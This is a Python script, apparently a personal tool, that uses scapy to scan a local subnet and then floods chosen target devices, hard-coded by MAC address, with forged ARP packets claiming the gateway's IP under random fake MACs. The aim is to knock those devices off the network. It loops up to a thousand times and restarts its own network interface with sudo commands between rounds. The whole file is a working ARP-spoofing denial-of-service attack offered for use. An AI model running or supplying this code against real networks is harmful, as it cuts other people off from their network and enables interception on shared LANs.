#! /usr/bin/env python

from scapy.all import *
import time
import random
import os

def GetSubNet(OurIP):
    Index,SubString = 0,""
    while True:
        num = OurIP.find('.',Index)
        if num != -1 : Index = num + 1
        else : SubString = OurIP[:Index];break
    return SubString

def GetMac(tgtIP,Retry=4):
    cnt = 0
    try:
        while cnt < Retry:
            tgtMac = getmacbyip(tgtIP)
            if tgtMac is None:
                print("Get Mac of IP <%s> failed...Will Retry the <%s> times"%(tgtIP,cnt));cnt += 1
            else:return tgtMac
    except:
        print("Get Mac of %s failed..."%tgtIP)
        return None

def GetBrocastIP(OurIP):return GetSubNet(OurIP) + "255"

def GetForgedIP(OurIP,Num):
    SubString = GetSubNet(OurIP)

    ForgedIP,i = [],0
    while i < Num:
        num = int(random.uniform(0,255));TempIP = SubString + "%d"%num
        if TempIP == OurIP:continue
        else:ForgedIP.append(TempIP);i += 1
    return ForgedIP

def GetForgedMac(OurMac,Num):
    ForgedMac,j = [],0
    while j < Num:
        while True:
            i,TempMac = 0,""
            while i < 6:
                num = random.randrange(0,256,1)
                TempMac = TempMac + "%02X"%num
                if i <= 4:TempMac = TempMac + ":"
                i += 1
            #Almost impossible that a forged MAC is our own.
            if TempMac == OurMac:pass
            else:ForgedMac.append(TempMac);j += 1;break
    return ForgedMac

Table = {}
def ScanfByArpOnce(OurIP = "192.168.0.1",Start = 0,End = 255,TimeOut = 3,ClearAtFirst = 1):
    if ClearAtFirst is 0 : Table.clear()
    SubString = GetSubNet(OurIP)
    ip = []
    for num in range(Start,End+1):ip.append(SubString+str(num))
    ans,unans=srp(Ether(dst="FF:FF:FF:FF:FF:FF")/ARP(op=1,pdst=ip),timeout=TimeOut)
    def GetArpResult(r):
        Table[r.sprintf("%ARP.hwsrc%")] = r.sprintf("%ARP.psrc%")
        return r.sprintf("%ARP.hwsrc%\t%ARP.psrc%")
    g = lambda(s,r):GetArpResult(r)
    ans.summary(g)

def ScanfByArp(Retry=4,Delay=4):
    for i in range(0,Retry):
        time.sleep(i*Delay)
        #Clear the table at first
        ScanfByArpOnce(Start=100,End=150,TimeOut=5,ClearAtFirst=i)

def GetIpByMac(Mac):
    return Table.get(Mac)
    
def Attack_MAC(Face,GWIP,MAC,PackNum,Counter,Interval):
    
    MY_ip = get_if_addr(Face)
    MY_mac = get_if_hwaddr(Face)
    if MY_ip is None or MY_mac is None:return
    print("%s -> %s"%(MY_ip,MY_mac))
    
    BctIP = GetBrocastIP(MY_ip)
    Bct_mac = "ff:ff:ff:ff:ff:ff"
    print("%s -> %s"%(BctIP,Bct_mac))
    
    GW_ip = GWIP
    GW_mac = GetMac(GW_ip)
    if GW_mac is None:return
    print("%s -> %s"%(GW_ip,GW_mac))
    
    PKT = []
    
    #scanf the subnet
    ScanfByArp(3,1)
    for XM_mac in MAC:
        XM_ip = GetIpByMac(XM_mac)
        print("%s -> %s"%(XM_ip,XM_mac))
    cnt = 0
    while True:
        PKT = []
        for XM_mac in MAC:
            XM_ip = GetIpByMac(XM_mac)
            #if the IP is not existed,pass it
            if XM_ip is None:continue
            Temp_mac = GetForgedMac(MY_mac,PackNum)
            PKT_ = Ether(dst=XM_mac)/ARP(op=1,psrc=GW_ip,hwsrc=Temp_mac,pdst=XM_ip,hwdst=XM_mac)
            PKT.append(PKT_)
        else : 
            if len(PKT) is 0:print ("Target not found...");return
        try:
            cnt += 1
            sendp(PKT,iface = Face);
            print("Will sleep for %s S and had sent %s PKTs"%(Interval,cnt))
            time.sleep(Interval)
        except:print("!!Send Error!!")
        if Counter == -1:pass
        else:
            if cnt >= Counter:return
            
#GWIP:your gateway's ip
#Interface:the network interface you want to use
#Delay:The delay between this action
def EnsureWifiConnection(GWIP="192.168.0.1",Interface="eth0",Delay=2):
    if IsWifiWorkWell(GWIP) is False:
        print("Will restart the interface <%s>"%Interface)
        os.system("sudo ifconfig %s down"%Interface)
        time.sleep(Delay)
        os.system("sudo ifconfig %s up"%Interface)
        time.sleep(Delay)
        os.system('sudo /etc/init.d/networking restart')
        time.sleep(Delay)
        print("Network restart finished...")
        return True
    else:return False
    
#To check whether the wifi is working well by acquiring GWIP's MAC(Usually our gateway's IP)
def IsWifiWorkWell(GWIP = "192.168.0.1"):
    res = GetMac(GWIP)
    if res is None or res is "ff:ff:ff:ff:ff:ff":return False
    else:return True
    
def DelayForxMinute(Length=1,Print=True):
    print("Delay started,Length is %s"%Length)
    num=0
    while num < Length:
        time.sleep(60);num += 1
        if Print is True:print("Delaying now...%s"%num)
    else:print("Delay ended...")

if __name__ == "__main__":
    DelayForxMinute(0,True)
    Counter = 0
    #the mac you want to attack
    TargetMac = ["04:e6:76:46:a6:f3","78:02:f8:34:4d:b5"]
    while True:
        EnsureWifiConnection("192.168.0.1","ens33",2)
        Attack_MAC("ens33","192.168.0.1",TargetMac,10,10,1)
        Counter += 1;if Counter >= 1000:break
